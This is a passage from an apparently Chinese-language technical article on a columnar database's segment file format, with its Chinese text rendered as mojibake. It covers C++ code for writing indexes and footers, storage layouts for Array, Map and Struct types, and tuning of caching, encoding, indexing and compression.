    <span class="hljs-comment">// å†™å…¥å„åˆ—çš„ç´¢å¼•</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; column_writer : _column_writers) {
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(column_writer-&gt;<span class="hljs-built_in">write_ordinal_index</span>());
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(column_writer-&gt;<span class="hljs-built_in">write_zone_map</span>());
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(column_writer-&gt;<span class="hljs-built_in">write_bitmap_index</span>());
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(column_writer-&gt;<span class="hljs-built_in">write_bloom_filter_index</span>());
    }
    
    <span class="hljs-comment">// å†™å…¥ Short Key Index</span>
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_write_short_key_index());
    
    <span class="hljs-comment">// å†™å…¥ Primary Key Indexï¼ˆUnique Key è¡¨ï¼‰</span>
    <span class="hljs-keyword">if</span> (_primary_key_index_builder != <span class="hljs-literal">nullptr</span>) {
        <span class="hljs-built_in">RETURN_IF_ERROR</span>(_write_primary_key_index());
    }
    
    *index_size = _file_writer-&gt;<span class="hljs-built_in">bytes_appended</span>() - start_offset;
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}

<span class="hljs-function">Status <span class="hljs-title">SegmentWriter::finalize_footer</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span>* segment_file_size)</span> </span>{
    <span class="hljs-comment">// 1. è®¾ç½® Footer å…ƒæ•°æ®</span>
    _footer.<span class="hljs-built_in">set_version</span>(<span class="hljs-number">1</span>);
    _footer.<span class="hljs-built_in">set_num_rows</span>(_num_rows_written);
    
    <span class="hljs-comment">// 2. åºåˆ—åŒ– Footer</span>
    std::string footer_buf;
    <span class="hljs-keyword">if</span> (!_footer.<span class="hljs-built_in">SerializeToString</span>(&amp;footer_buf)) {
        <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">InternalError</span>(<span class="hljs-string">"Failed to serialize segment footer"</span>);
    }
    
    <span class="hljs-comment">// 3. å†™å…¥ Footer</span>
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_file_writer-&gt;<span class="hljs-built_in">append</span>(footer_buf));
    
    <span class="hljs-comment">// 4. å†™å…¥ Footer Size</span>
    <span class="hljs-type">uint8_t</span> footer_size_buf[<span class="hljs-number">4</span>];
    <span class="hljs-built_in">encode_fixed32_le</span>(footer_size_buf, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint32_t</span>&gt;(footer_buf.<span class="hljs-built_in">size</span>()));
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_file_writer-&gt;<span class="hljs-built_in">append</span>(<span class="hljs-built_in">Slice</span>(footer_size_buf, <span class="hljs-number">4</span>)));
    
    <span class="hljs-comment">// 5. å†™å…¥ Checksum</span>
    <span class="hljs-type">uint32_t</span> checksum = crc32c::<span class="hljs-built_in">Value</span>(footer_buf.<span class="hljs-built_in">data</span>(), footer_buf.<span class="hljs-built_in">size</span>());
    <span class="hljs-type">uint8_t</span> checksum_buf[<span class="hljs-number">4</span>];
    <span class="hljs-built_in">encode_fixed32_le</span>(checksum_buf, checksum);
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_file_writer-&gt;<span class="hljs-built_in">append</span>(<span class="hljs-built_in">Slice</span>(checksum_buf, <span class="hljs-number">4</span>)));
    
    <span class="hljs-comment">// 6. å†™å…¥ Magic Number</span>
    <span class="hljs-built_in">RETURN_IF_ERROR</span>(_file_writer-&gt;<span class="hljs-built_in">append</span>(<span class="hljs-built_in">Slice</span>(k_segment_magic, k_segment_magic_length)));
    
    *segment_file_size = _file_writer-&gt;<span class="hljs-built_in">bytes_appended</span>();
    <span class="hljs-keyword">return</span> Status::<span class="hljs-built_in">OK</span>();
}
</code></pre>
<h3 data-id="heading-59">8.3 å®Œæ•´æ—¶åºå›¾</h3>
<pre><code class="hljs language-scss" lang="scss">å®¢æˆ·ç«¯
  â”‚
  â”œâ”€â†’ <span class="hljs-built_in">init</span>() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                                                    â”‚
  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚   â”‚  åˆå§‹åŒ–æ‰€æœ‰ ColumnWriterï¼š                                                         â”‚
  â”‚   â”‚    - åˆ›å»º PageBuilderï¼ˆé€‰æ‹©ç¼–ç æ–¹å¼ï¼‰                                           â”‚
  â”‚   â”‚    - åˆ›å»ºOrdinalIndexWriter                                                    â”‚
  â”‚   â”‚    - åˆ›å»º ZoneMapIndexWriterï¼ˆå¦‚æœéœ€è¦ï¼‰                                      â”‚
  â”‚   â”‚    - åˆ›å»º BitmapIndexWriterï¼ˆå¦‚æœéœ€è¦ï¼‰                                      â”‚
  â”‚   â”‚    - åˆ›å»º BloomFilterIndexWriterï¼ˆå¦‚æœéœ€è¦ï¼‰                                  â”‚
  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚
  â”œâ”€â†’ <span class="hljs-built_in">append_block</span>() Ã— N â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                                                    â”‚
  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚   â”‚  å¯¹æ¯ä¸€åˆ—ï¼š                                                                       â”‚
  â”‚   â”‚    ColumnWriter::<span class="hljs-built_in">append_data</span>()                                              â”‚
  â”‚   â”‚      â”œâ”€ PageBuilder::<span class="hljs-built_in">add</span>()            # æ·»åŠ åˆ°å½“å‰ Page                       â”‚
  â”‚   â”‚      â”œâ”€ BitmapIndexWriter::<span class="hljs-built_in">add</span>()      # æ›´æ–° Bitmap Index                   â”‚
  â”‚   â”‚      â”œâ”€ ZoneMapIndexWriter::<span class="hljs-built_in">add</span>()     # æ›´æ–° Zone Map                       â”‚
  â”‚   â”‚      â”œâ”€ BloomFilterIndexWriter::<span class="hljs-built_in">add</span>() # æ›´æ–° Bloom Filter                  â”‚
  â”‚   â”‚      â”œâ”€ NullBitmapBuilder::<span class="hljs-built_in">add_run</span>()  # æ›´æ–° NULL ä½å›¾                     â”‚
  â”‚   â”‚      â””â”€ å¦‚æœ Page æ»¡ï¼š<span class="hljs-built_in">finish_current_page</span>()                                   â”‚
  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚
  â”œâ”€â†’ <span class="hljs-built_in">finalize</span>() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                                                    â”‚
  â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚   â”‚  <span class="hljs-number">1</span>. <span class="hljs-built_in">finalize_columns_data</span>()                                                  â”‚
  â”‚   â”‚       â”œâ”€ ColumnWriter::<span class="hljs-built_in">finish</span>()          # å®Œæˆå½“å‰ Page                    â”‚
  â”‚   â”‚       â””â”€ ColumnWriter::<span class="hljs-built_in">write_data</span>()       # å†™å…¥æ‰€æœ‰ Pages                 â”‚
  â”‚   â”‚                                                                             â”‚
  â”‚   â”‚  <span class="hljs-number">2</span>. <span class="hljs-built_in">finalize_columns_index</span>()                                                â”‚
  â”‚   â”‚       â”œâ”€ <span class="hljs-built_in">write_ordinal_index</span>()            # å†™å…¥ Ordinal Index              â”‚
  â”‚   â”‚       â”œâ”€ <span class="hljs-built_in">write_zone_map</span>()                 # å†™å…¥ Zone Map                   â”‚
  â”‚   â”‚       â”œâ”€ <span class="hljs-built_in">write_bitmap_index</span>()             # å†™å…¥ Bitmap Index               â”‚
  â”‚   â”‚       â”œâ”€ <span class="hljs-built_in">write_bloom_filter_index</span>()       # å†™å…¥ Bloom Filter               â”‚
  â”‚   â”‚       â”œâ”€ <span class="hljs-built_in">write_short_key_index</span>()          # å†™å…¥ Short Key Index            â”‚
  â”‚   â”‚       â””â”€ <span class="hljs-built_in">write_primary_key_index</span>()        # å†™å…¥ Primary Key Index          â”‚
  â”‚   â”‚                                                                             â”‚
  â”‚   â”‚  <span class="hljs-number">3</span>. <span class="hljs-built_in">finalize_footer</span>()                                                       â”‚
  â”‚   â”‚       â”œâ”€ åºåˆ—åŒ– SegmentFooterPB                                               â”‚
  â”‚   â”‚       â”œâ”€ å†™å…¥ Footer + FooterSize                                            â”‚
  â”‚   â”‚       â”œâ”€ å†™å…¥ Checksum                                                        â”‚
  â”‚   â”‚       â””â”€ å†™å…¥ Magic Number                                                    â”‚
  â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
  â”‚
  â””â”€â†’ <span class="hljs-built_in">close</span>() â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                                                                                       â”‚
        å…³é—­æ–‡ä»¶ï¼Œé‡Šæ”¾èµ„æº                                                                 â”‚
      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h2 data-id="heading-60">9. å¤æ‚ç±»å‹å­˜å‚¨</h2>
<h3 data-id="heading-61">9.1 Array ç±»å‹</h3>
<p><strong>ç»“æ„</strong>ï¼š</p>
<ul>
<li><strong>Offset Column</strong>ï¼šå­˜å‚¨æ¯ä¸ªæ•°ç»„çš„èµ·å§‹ä½ç½®</li>
<li><strong>Item Column</strong>ï¼šå­˜å‚¨æ‰€æœ‰æ•°ç»„å…ƒç´ </li>
<li><strong>Null Column</strong>ï¼ˆå¯é€‰ï¼‰ï¼šæ ‡è®°å“ªäº›æ•°ç»„ä¸º NULL</li>
</ul>
<h4 data-id="heading-62">å­˜å‚¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> events (
    id <span class="hljs-type">INT</span>,
    tags <span class="hljs-keyword">ARRAY</span><span class="hljs-operator">&lt;</span><span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>)<span class="hljs-operator">&gt;</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> events <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-number">1</span>, [<span class="hljs-string">'sports'</span>, <span class="hljs-string">'news'</span>]),
(<span class="hljs-number">2</span>, [<span class="hljs-string">'tech'</span>, <span class="hljs-string">'ai'</span>, <span class="hljs-string">'ml'</span>]),
(<span class="hljs-number">3</span>, <span class="hljs-keyword">NULL</span>),
(<span class="hljs-number">4</span>, [<span class="hljs-string">'music'</span>]);
</code></pre>
<p><strong>å­˜å‚¨å¸ƒå±€</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">Offset</span> <span class="hljs-keyword">Column</span>ï¼ˆ<span class="hljs-type">BIGINT</span>ï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">-----+-----+-----+-----+-----+</span>
<span class="hljs-operator">|</span>  <span class="hljs-number">0</span>  <span class="hljs-operator">|</span>  <span class="hljs-number">2</span>  <span class="hljs-operator">|</span>  <span class="hljs-number">5</span>  <span class="hljs-operator">|</span>  <span class="hljs-number">5</span>  <span class="hljs-operator">|</span>  <span class="hljs-number">6</span>  <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----+-----+-----+-----+-----+</span>
  <span class="hljs-operator">^</span>     <span class="hljs-operator">^</span>     <span class="hljs-operator">^</span>     <span class="hljs-operator">^</span>     <span class="hljs-operator">^</span>
 row0  row1  row2  row3  row4(<span class="hljs-keyword">end</span>)

Item <span class="hljs-keyword">Column</span>ï¼ˆ<span class="hljs-type">VARCHAR</span>ï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">---------+--------+--------+------+------+--------+</span>
<span class="hljs-operator">|</span><span class="hljs-string">'sports'</span> <span class="hljs-operator">|</span> <span class="hljs-string">'news'</span> <span class="hljs-operator">|</span> <span class="hljs-string">'tech'</span> <span class="hljs-operator">|</span> <span class="hljs-string">'ai'</span> <span class="hljs-operator">|</span> <span class="hljs-string">'ml'</span> <span class="hljs-operator">|</span><span class="hljs-string">'music'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">---------+--------+--------+------+------+--------+</span>
    <span class="hljs-number">0</span>        <span class="hljs-number">1</span>        <span class="hljs-number">2</span>       <span class="hljs-number">3</span>      <span class="hljs-number">4</span>       <span class="hljs-number">5</span>

<span class="hljs-keyword">Null</span> <span class="hljs-keyword">Column</span>ï¼ˆTINYINTï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">---+---+---+---+</span>
<span class="hljs-operator">|</span> <span class="hljs-number">0</span> <span class="hljs-operator">|</span> <span class="hljs-number">0</span> <span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span> <span class="hljs-number">0</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">---+---+---+---+</span>
row0 row1 row2 row3
</code></pre>
<h4 data-id="heading-63">è¯»å–é€»è¾‘</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è¯»å– row[1] çš„æ•°ç»„</span>
<span class="hljs-type">offset_t</span> start = offset_column[<span class="hljs-number">1</span>];  <span class="hljs-comment">// 2</span>
<span class="hljs-type">offset_t</span> end = offset_column[<span class="hljs-number">2</span>];    <span class="hljs-comment">// 5</span>
<span class="hljs-type">size_t</span> count = end - start;          <span class="hljs-comment">// 3</span>

<span class="hljs-comment">// è¯»å– item_column[2..4]</span>
std::vector&lt;std::string&gt; result;
<span class="hljs-keyword">for</span> (<span class="hljs-type">offset_t</span> i = start; i &lt; end; i++) {
    result.<span class="hljs-built_in">push_back</span>(item_column[i]);
}
<span class="hljs-comment">// result = ['tech', 'ai', 'ml']</span>
</code></pre>
<h3 data-id="heading-64">9.2 Map ç±»å‹</h3>
<p><strong>ç»“æ„</strong>ï¼š</p>
<ul>
<li><strong>Offset Column</strong>ï¼šå­˜å‚¨æ¯ä¸ª Map çš„èµ·å§‹ä½ç½®</li>
<li><strong>Key Column</strong>ï¼šå­˜å‚¨æ‰€æœ‰ Key</li>
<li><strong>Value Column</strong>ï¼šå­˜å‚¨æ‰€æœ‰ Value</li>
<li><strong>Null Column</strong>ï¼ˆå¯é€‰ï¼‰ï¼šæ ‡è®°å“ªäº› Map ä¸º NULL</li>
</ul>
<h4 data-id="heading-65">å­˜å‚¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> user_attrs (
    user_id <span class="hljs-type">INT</span>,
    attrs MAP<span class="hljs-operator">&lt;</span><span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>), <span class="hljs-type">INT</span><span class="hljs-operator">&gt;</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> user_attrs <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-number">1</span>, {<span class="hljs-string">'age'</span>: <span class="hljs-number">25</span>, <span class="hljs-string">'score'</span>: <span class="hljs-number">90</span>}),
(<span class="hljs-number">2</span>, {<span class="hljs-string">'age'</span>: <span class="hljs-number">30</span>}),
(<span class="hljs-number">3</span>, <span class="hljs-keyword">NULL</span>);
</code></pre>
<p><strong>å­˜å‚¨å¸ƒå±€</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">Offset</span> <span class="hljs-keyword">Column</span>ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">-----+-----+-----+-----+</span>
<span class="hljs-operator">|</span>  <span class="hljs-number">0</span>  <span class="hljs-operator">|</span>  <span class="hljs-number">2</span>  <span class="hljs-operator">|</span>  <span class="hljs-number">3</span>  <span class="hljs-operator">|</span>  <span class="hljs-number">3</span>  <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----+-----+-----+-----+</span>
 row0  row1  row2  row3(<span class="hljs-keyword">end</span>)

Key <span class="hljs-keyword">Column</span>ï¼ˆ<span class="hljs-type">VARCHAR</span>ï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">---------+---------+-------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'age'</span>   <span class="hljs-operator">|</span> <span class="hljs-string">'score'</span> <span class="hljs-operator">|</span> <span class="hljs-string">'age'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">---------+---------+-------+</span>
    <span class="hljs-number">0</span>         <span class="hljs-number">1</span>        <span class="hljs-number">2</span>

<span class="hljs-keyword">Value</span> <span class="hljs-keyword">Column</span>ï¼ˆ<span class="hljs-type">INT</span>ï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">-----+-----+-----+</span>
<span class="hljs-operator">|</span> <span class="hljs-number">25</span>  <span class="hljs-operator">|</span> <span class="hljs-number">90</span>  <span class="hljs-operator">|</span> <span class="hljs-number">30</span>  <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----+-----+-----+</span>
   <span class="hljs-number">0</span>     <span class="hljs-number">1</span>     <span class="hljs-number">2</span>
</code></pre>
<h3 data-id="heading-66">9.3 Struct ç±»å‹</h3>
<p><strong>ç»“æ„</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªå­å­—æ®µç‹¬ç«‹å­˜å‚¨ä¸ºä¸€ä¸ª Column</li>
<li><strong>Null Column</strong>ï¼ˆå¯é€‰ï¼‰ï¼šæ ‡è®°å“ªäº› Struct ä¸º NULL</li>
</ul>
<h4 data-id="heading-67">å­˜å‚¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
    order_id <span class="hljs-type">INT</span>,
    address STRUCT<span class="hljs-operator">&lt;</span>
        city <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
        zipcode <span class="hljs-type">INT</span>
    <span class="hljs-operator">&gt;</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> orders <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-number">1</span>, STRUCT(<span class="hljs-string">'Beijing'</span>, <span class="hljs-number">100000</span>)),
(<span class="hljs-number">2</span>, STRUCT(<span class="hljs-string">'Shanghai'</span>, <span class="hljs-number">200000</span>)),
(<span class="hljs-number">3</span>, <span class="hljs-keyword">NULL</span>);
</code></pre>
<p><strong>å­˜å‚¨å¸ƒå±€</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">address.city åˆ—ï¼ˆ<span class="hljs-type">VARCHAR</span>ï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------+</span>
<span class="hljs-operator">|</span> <span class="hljs-string">'Beijing'</span> <span class="hljs-operator">|</span> <span class="hljs-string">'Shanghai'</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">-----------+------------+</span>
   row0        row1

address.zipcode åˆ—ï¼ˆ<span class="hljs-type">INT</span>ï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">--------+--------+</span>
<span class="hljs-operator">|</span> <span class="hljs-number">100000</span> <span class="hljs-operator">|</span> <span class="hljs-number">200000</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">--------+--------+</span>
   row0     row1

address çš„ <span class="hljs-keyword">Null</span> åˆ—ï¼ˆTINYINTï¼‰ï¼š
<span class="hljs-operator">+</span><span class="hljs-comment">---+---+---+</span>
<span class="hljs-operator">|</span> <span class="hljs-number">0</span> <span class="hljs-operator">|</span> <span class="hljs-number">0</span> <span class="hljs-operator">|</span> <span class="hljs-number">1</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">---+---+---+</span>
row0 row1 row2
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>Struct çš„å­å­—æ®µç›´æ¥å±•å¼€å­˜å‚¨ï¼Œæ— éœ€ Offset Column</li>
<li>æ¯ä¸ªå­å­—æ®µéƒ½æ˜¯ä¸€ä¸ªå®Œæ•´çš„ ColumnWriter</li>
<li>é€‚åˆåµŒå¥—æŸ¥è¯¢ï¼š<code>WHERE address.city = 'Beijing'</code></li>
</ul>
<hr/>
<h2 data-id="heading-68">10. æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-69">10.1 PageCache ä¼˜åŒ–</h3>
<p><strong>ä½œç”¨</strong>ï¼šç¼“å­˜è§£å‹åçš„ Pageï¼Œå‡å°‘ CPU å¼€é”€ã€‚</p>
<p><strong>é…ç½®</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># be.conf</span>
storage_page_cache_limit=20%  <span class="hljs-comment"># PageCache å¤§å°ï¼ˆå†…å­˜çš„ 20%ï¼‰</span>
</code></pre>
<p><strong>ä½¿ç”¨ç­–ç•¥</strong>ï¼š</p>
<ul>
<li><strong>LRU æ·æ±°</strong>ï¼šæœ€è¿‘æœ€å°‘ä½¿ç”¨çš„ Page è¢«æ·˜æ±°</li>
<li><strong>åˆ†ç±»ç¼“å­˜</strong>ï¼šIndex Page å’Œ Data Page åˆ†å¼€ç¼“å­˜</li>
<li><strong>é¢„å–</strong>ï¼šè¯»å–æ—¶é¢„å–åç»­ Page</li>
</ul>
<h3 data-id="heading-70">10.2 ç¼–ç ä¼˜åŒ–</h3>
<p><strong>é€‰æ‹©ç­–ç•¥</strong>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ ¹æ®æ•°æ®ç‰¹å¾åŠ¨æ€é€‰æ‹©ç¼–ç </span>
<span class="hljs-function">EncodingTypePB <span class="hljs-title">choose_encoding</span><span class="hljs-params">(FieldType type, <span class="hljs-type">const</span> DataStatistics&amp; stats)</span> </span>{
    <span class="hljs-keyword">if</span> (type == OLAP_FIELD_TYPE_VARCHAR) {
        <span class="hljs-keyword">if</span> (stats.distinct_count &lt; <span class="hljs-number">1000</span>) {
            <span class="hljs-keyword">return</span> DICT_ENCODING;  <span class="hljs-comment">// ä½åŸºæ•°ï¼Œä½¿ç”¨å­—å…¸ç¼–ç </span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (stats.has_common_prefix) {
            <span class="hljs-keyword">return</span> PREFIX_ENCODING;  <span class="hljs-comment">// æœ‰å…¬å…±å‰ç¼€</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> PLAIN_ENCODING;  <span class="hljs-comment">// é«˜åŸºæ•°</span>
        }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">is_integer_type</span>(type)) {
        <span class="hljs-keyword">if</span> (stats.is_sorted &amp;&amp; stats.range_small) {
            <span class="hljs-keyword">return</span> FOR_ENCODING;  <span class="hljs-comment">// Frame-Of-Reference</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> BIT_SHUFFLE;  <span class="hljs-comment">// é»˜è®¤ä½¿ç”¨ BitShuffle</span>
        }
    }
    <span class="hljs-keyword">return</span> DEFAULT_ENCODING;
}
</code></pre>
<h3 data-id="heading-71">10.3 ç´¢å¼•ä¼˜åŒ–</h3>
<p><strong>é€‰æ‹©åŸåˆ™</strong>ï¼š</p>






























<table><thead><tr><th>åœºæ™¯</th><th>æ¨èç´¢å¼•</th><th>åŸå› </th></tr></thead><tbody><tr><td>ä½åŸºæ•°åˆ—</td><td>Bitmap Index</td><td>ç©ºé—´å°ï¼ŒæŸ¥è¯¢å¿«ï¼Œæ”¯æŒå¤šæ¡ä»¶ç»„åˆ</td></tr><tr><td>é«˜åŸºæ•°åˆ—</td><td>Bloom Filter</td><td>è¿‡æ»¤æ•ˆæœå¥½ï¼Œç©ºé—´å¼€é”€ä¸­ç­‰</td></tr><tr><td>èŒƒå›´æŸ¥è¯¢</td><td>Zone Map</td><td>æ¯åˆ—é»˜è®¤å¯ç”¨ï¼Œé€‚åˆæ‰€æœ‰åœºæ™¯</td></tr><tr><td>å…¨æ–‡æ£€ç´¢</td><td>Inverted Index</td><td>æ”¯æŒåˆ†è¯å’ŒçŸ­è¯­åŒ¹é…</td></tr></tbody></table>
<p><strong>é¿å…è¿‡åº¦ç´¢å¼•</strong>ï¼š</p>
<ul>
<li>ä¸è¦åœ¨æ‰€æœ‰åˆ—ä¸Šéƒ½å»ºç«‹ Bitmap Index</li>
<li>é«˜åŸºæ•°åˆ—ä¸é€‚åˆ Bitmap Index</li>
<li>Bloom Filter åªåœ¨é«˜é€‰æ‹©æ€§åˆ—ä¸Šå»ºç«‹</li>
</ul>
<h3 data-id="heading-72">10.4 å‹ç¼©ä¼˜åŒ–</h3>
<p><strong>å‹ç¼©ç‡ vs. é€Ÿåº¦</strong>ï¼š</p>
<pre><code class="hljs">é«˜å‹ç¼©ç‡ï¼šZSTD &gt; LZ4HC &gt; ZLIB &gt; LZ4F &gt; LZ4 &gt; SNAPPY
é«˜é€Ÿåº¦ï¼š  LZ4 &gt; SNAPPY &gt; LZ4F &gt; LZ4HC &gt; ZSTD &gt; ZLIB
</code></pre>
<p><strong>é€‰æ‹©å»ºè®®</strong>ï¼š</p>
<ul>
<li><strong>é»˜è®¤</strong>ï¼šLZ4ï¼ˆé€Ÿåº¦å¿«ï¼Œå‹ç¼©ç‡åˆç†ï¼‰</li>
<li><strong>å­˜å‚¨æ•æ„Ÿ</strong>ï¼šZSTDï¼ˆæœ€é«˜å‹ç¼©ç‡ï¼‰</li>
<li><strong>CPU æ•æ„Ÿ</strong>ï¼šLZ4 ç”šè‡³ NO_COMPRESSION</li>
</ul>
<hr/>
<h2 data-id="heading-73">11. æ€»ç»“</h2>
